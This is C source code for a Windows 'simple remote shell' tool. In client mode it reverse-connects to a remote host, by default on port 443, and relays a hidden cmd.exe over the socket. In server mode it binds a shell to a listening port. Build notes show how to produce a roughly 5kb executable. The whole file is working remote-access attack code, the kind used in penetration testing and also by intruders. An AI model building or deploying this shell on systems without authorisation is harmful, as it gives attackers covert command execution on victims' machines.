
/**
  Copyright (C) 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
/**

To compile this, you can use msvc or gcc

  gcc s2.c -lws2_32 -lshlwapi -orcmd
  cl s2.c ws2_32.lib shlwapi.lib
  
To create a smaller exe file around 5kb, compile with clib.c but this requires longer command

  cl s2.c /nologo /c /O2 /Os /GS- /Oi-
  cl clib.c /nologo /c /O2 /Os /GS- /Oi-
  link /nologo /NODEFAULTLIB /MERGE:.rdata=.text s2.obj clib.obj Shlwapi.lib user32.lib kernel32.lib ws2_32.lib advapi32.lib
  
*/

#define _WIN32_WINNT 0x0501
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <Shlwapi.h>

#define CLIENT_MODE 0
#define SERVER_MODE 1

#define DEFAULT_PORT "443" // as client or server

// structure for parameters
typedef struct _args_t {
  SOCKET s, r;
  char *port, *address;
  int port_nbr, ai_family, mode, ai_addrlen;
  struct sockaddr *ai_addr;
  char ip[64];
  struct sockaddr_in v4;
  struct sockaddr_in6 v6;
} args_t;

/**F*****************************************************************/
void xstrerror (char *fmt, ...) 
/**
 * PURPOSE : Display windows error
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
  char    *error=NULL;
  va_list arglist;
  char    buffer[2048];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL))
  {
    printf ("[ %s : %s\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("[ %s : %i\n", buffer, dwError);
  }
}

/**F*****************************************************************/
char *addr2ip (args_t *p)
/**
 * PURPOSE : Convert network address to ip string
 *
 * RETURN :  String ASCII representation of network address
 *
 * NOTES :   None
 *
 *F*/
{
  DWORD ip_size=64;
  WSAAddressToString (p->ai_addr, p->ai_addrlen, 
    NULL, (char*)p->ip, &ip_size);
    
  return (char*)p->ip;
}

/**F*****************************************************************/
BOOL open_tcp (args_t *p)
/**
 * PURPOSE : initialize winsock, resolve network address
 *
 * RETURN :  TRUE for okay else FALSE
 *
 * NOTES :   None
 *
 *F*/
{
  struct addrinfo *list=NULL, *e=NULL;
  struct addrinfo hints;
  BOOL            bStatus=FALSE;
  WSADATA         wsa;
  int             t=1;
  
  // initialize winsock
  WSAStartup (MAKEWORD (2, 0), &wsa);
  
  // set network address length to zero
  p->ai_addrlen = 0;
  
  // if no address supplied
  if (p->address==NULL)
  {
    // is it ipv4?
    if (p->ai_family==AF_INET) {
      p->v4.sin_family      = AF_INET; 
      p->v4.sin_port        = htons((u_short)p->port_nbr);
      p->v4.sin_addr.s_addr = INADDR_ANY;
      
      p->ai_addr    = (SOCKADDR*)&p->v4;
      p->ai_addrlen = sizeof (struct sockaddr_in);
    } else {
      // else it's ipv6
      p->v6.sin6_family     = AF_INET6;
      p->v6.sin6_port       = htons((u_short)p->port_nbr);
      p->v6.sin6_addr       = in6addr_any;
      
      p->ai_addr    = (SOCKADDR*)&p->v6;
      p->ai_addrlen = sizeof (struct sockaddr_in6);
    }
  } else {
    ZeroMemory (&hints, sizeof (hints));

    hints.ai_flags    = AI_PASSIVE;
    hints.ai_family   = p->ai_family;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;    
    
    // get all network addresses
    t=getaddrinfo (p->address, p->port, &hints, &list);
    if (t == 0) 
    {
      for (e=list; e!=NULL; e=e->ai_next) 
      {
        // copy to ipv4 structure
        if (p->ai_family==AF_INET) {
          memcpy (&p->v4, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (SOCKADDR*)&p->v4;        
        } else {
          // ipv6 structure
          memcpy (&p->v6, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (SOCKADDR*)&p->v6;
        }
        // assign size of structure
        p->ai_addrlen = e->ai_addrlen;
        break;
      }
      freeaddrinfo (list);
    } else {
      xstrerror ("getaddrinfo");
    }
  }
  // create socket if we have address resolved
  if (p->ai_addrlen!=0) 
  {
    p->s=WSASocket(p->ai_family, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (p->s!=SOCKET_ERROR) 
    {
      // this is only really necessary for listen operations
      t=1;
      setsockopt (p->s, SOL_SOCKET, SO_REUSEADDR, (char*)&t, sizeof (t));
      bStatus=TRUE;
    }
  }
  return bStatus;
}

/**F*****************************************************************/
void close_tcp (args_t *p)
/**
 * PURPOSE : shutdown and close sockets, events and cleanup
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
  // disable send/receive operations
  shutdown (p->s, SD_BOTH);
  // close socket
  closesocket (p->s);
  // clean up
  WSACleanup();
}

/**F*****************************************************************/
void usage (void) 
{
  printf ("\n  usage: s1 <address> [options]\n");
  printf ("\n  -4           Use IP version 4 (default)");
  printf ("\n  -6           Use IP version 6");
  printf ("\n  -l           Listen for incoming connections");
  printf ("\n  -p <number>  Port number to use (default is 443)");
  printf ("\n\n  Press any key to continue . . .");
  getchar ();
  exit (0);
}

/**F*****************************************************************/
char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void parse_args (args_t *p, int argc, char *argv[])
{
  int  i;
  char opt;
  
  // for each argument
  for (i=1; i<argc; i++)
  {
    // is this option?
    if (argv[i][0]=='-' || argv[i][1]=='/')
    {
      // get option value
      opt=argv[i][1];
      switch (opt)
      {
        case '4':
          p->ai_family=AF_INET;
          break;
        case '6':     // use ipv6 (default is ipv4)
          p->ai_family=AF_INET6;
          break;
        case 'l':     // listen for incoming connections
          p->mode=SERVER_MODE;
          break;
        case 'p':     // port number
          p->port=getparam(argc, argv, &i);
          p->port_nbr=atoi(p->port);
          break;
        case '?':     // display usage
        case 'h':
          usage ();
          break;
        default:
          printf ("[ unknown option %c\n", opt);
          break;
      }
    } else {
      // assume it's hostname or ip
      p->address=argv[i];
    }
  }
}

/**F*****************************************************************/
DWORD wait_evt (HANDLE *evt, DWORD evt_cnt, 
  DWORD sck_evt, SOCKET s)
{
  WSANETWORKEVENTS ne;
  u_long           off=0;
  DWORD            e;
  
  // wait for read/close and accept events
  WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ | FD_ACCEPT);
  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, INFINITE);

  // enumerate events on socket
  WSAEnumNetworkEvents (s, evt[sck_evt], &ne);
  // disable events on socket  
  WSAEventSelect (s, evt[sck_evt], 0);
  // set to blocking mode
  ioctlsocket (s, FIONBIO, &off);
  // socket closed?
  if (ne.lNetworkEvents & FD_CLOSE) {
    e = ~0UL;
  }
  return e;
}

/**F*****************************************************************/
void cmd (SOCKET s)
{
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  
  HANDLE              lh[4];
  DWORD               p, e, wr;
  BYTE                buf[BUFSIZ];
  int                 len;
  HANDLE              evt[MAXIMUM_WAIT_OBJECTS];
  DWORD               evt_cnt=0, sck_evt=0;
  DWORD               stdout_evt=0, proc_evt=0;

  // create event for socket
  evt[sck_evt = evt_cnt++] = WSACreateEvent();
  
  // initialize security descriptor
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  // create anonymous read/write pipes for stdin of cmd.exe
  if (CreatePipe (&lh[0], &lh[1], &sa, 0)) 
  {  
    // format named pipe using tick count and current process id
    wnsprintf ((char*)buf, BUFSIZ, "\\\\.\\pipe\\%08X", 
      GetCurrentProcessId() ^ GetTickCount());
    
    // create named pipe for stdout/stderr of cmd.exe
    lh[2] = CreateNamedPipe ((char*)buf, 
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
        
    if (lh[2] != INVALID_HANDLE_VALUE) 
    { 
      // open the pipe
      lh[3] = CreateFile ((char*)buf, MAXIMUM_ALLOWED, 
          0, &sa, OPEN_EXISTING, 0, NULL);
      
      if (lh[3] != INVALID_HANDLE_VALUE) 
      {
        // create event for stdout handle of cmd.exe
        // initially in a signalled state
        evt[evt_cnt]=CreateEvent (NULL, TRUE, TRUE, NULL);
        stdout_evt = evt_cnt++;
  
        // zero initialize parameters for CreateProcess
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        si.cb              = sizeof (si);
        si.hStdInput       = lh[0];  // assign the anon read pipe
        si.hStdError       = lh[3];  // assign the named write pipe
        si.hStdOutput      = lh[3];  // 
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        // execute cmd.exe with no window
        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          // monitor state of cmd.exe
          evt[proc_evt = evt_cnt++] = pi.hProcess;
          
          ZeroMemory (&lap, sizeof (lap));
          // assign stdout event
          lap.hEvent = evt[stdout_evt];
          
          // set pending to 0
          p=0;
          
          for (;;)
          {
            // wait for events on cmd.exe and socket
            e=wait_evt(evt, evt_cnt, sck_evt, s);

            // cmd.exe ended?
            if (e==proc_evt) {
              break;
            }
            
            // wait failed?
            if (e == -1) {
              break;
            }
            // is this socket event?
            if (e == sck_evt) 
            {
              // receive data from socket
              len=recv (s, (char*)buf, sizeof(buf), 0);
              if (len<=0) break;
              
              // write to stdin of cmd.exe
              WriteFile (lh[1], buf, len, &wr, 0);             
            } else
           
            // output from cmd.exe?
            if (e == stdout_evt) 
            {
              // if not in pending read state, read stdin
              if (p == 0)
              {
                ReadFile (lh[2], buf, sizeof(buf), 
                  (LPDWORD)&len, &lap);
                p++;
              } else {
                // get overlapped result
                if (!GetOverlappedResult (lh[2], &lap, 
                  (LPDWORD)&len, FALSE)) {
                  break;
                }
              }
              // if we have something
              if (len != 0)
              {
                // send to remote
                len=send (s, (char*)buf, len, 0);
                if (len<=0) break;
                p--;
              }
            }
          }
          // end cmd.exe incase it's still running
          TerminateProcess (pi.hProcess, 0);
          // close handles and decrease events
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
          evt_cnt--;
        }
        // close handle to named pipe for stdout
        CloseHandle (lh[3]);
      }
      // close named pipe for stdout
      CloseHandle (lh[2]);
    }
    // close anon pipes for read/write to stdin
    CloseHandle (lh[1]);
    CloseHandle (lh[0]);
  }
  // close stdout event handle
  CloseHandle (evt[stdout_evt]);
  evt_cnt--;
  // close socket event handle
  CloseHandle (evt[sck_evt]);
  evt_cnt--;
}

// reverse connect to remote host
void client(args_t *p)
{
  printf ("[ connecting to %s\n", addr2ip(p));
  
  if (connect (p->s, p->ai_addr, p->ai_addrlen)!=SOCKET_ERROR)
  {
    printf ("[ connected\n");
    cmd(p->s);
    printf ("[ closing connection\n");
  } else {
    xstrerror ("connect");
  }
}

void server(args_t *p)
{
  // bind to local address
  if (bind (p->s, p->ai_addr, p->ai_addrlen) != SOCKET_ERROR) 
  {
    // listen for incoming connections
    if (listen (p->s, SOMAXCONN) != SOCKET_ERROR) 
    {
      printf ("[ waiting for connections on %s\n", addr2ip(p));
      p->r=accept (p->s, p->ai_addr, &p->ai_addrlen);
      
      if (p->r!=SOCKET_ERROR) {
        printf ("[ connection from %s\n", addr2ip(p));
        cmd(p->r);
        printf ("[ closing connection\n");
        shutdown (p->r, SD_BOTH);
        closesocket (p->r);
      } else {
        xstrerror ("accept()");
      }       
    } else {
      xstrerror ("listen()");
    }
  } else {
    xstrerror ("bind()");
  }
}

int main (int argc, char *argv[])
{
  args_t args;
  
  memset (&args, 0, sizeof(args));
  
  // set default parameters
  args.address   = NULL;
  args.ai_family = AF_INET;
  args.port      = DEFAULT_PORT;
  args.port_nbr  = atoi(args.port);
  args.mode      = -1;
  
  printf ("\n[ simple remote shell for windows v2\n");
  
  parse_args(&args, argc, argv);
  
  if (args.mode == -1) {
    if (args.address==NULL) {
      args.mode=SERVER_MODE;
    } else {
      args.mode=CLIENT_MODE;
    }
  }
  
  if (open_tcp(&args))
  {
    if (args.mode == SERVER_MODE)
    {
      server(&args);
    } else {
      client(&args);
    }
    close_tcp(&args);
  }
  return 0;
}

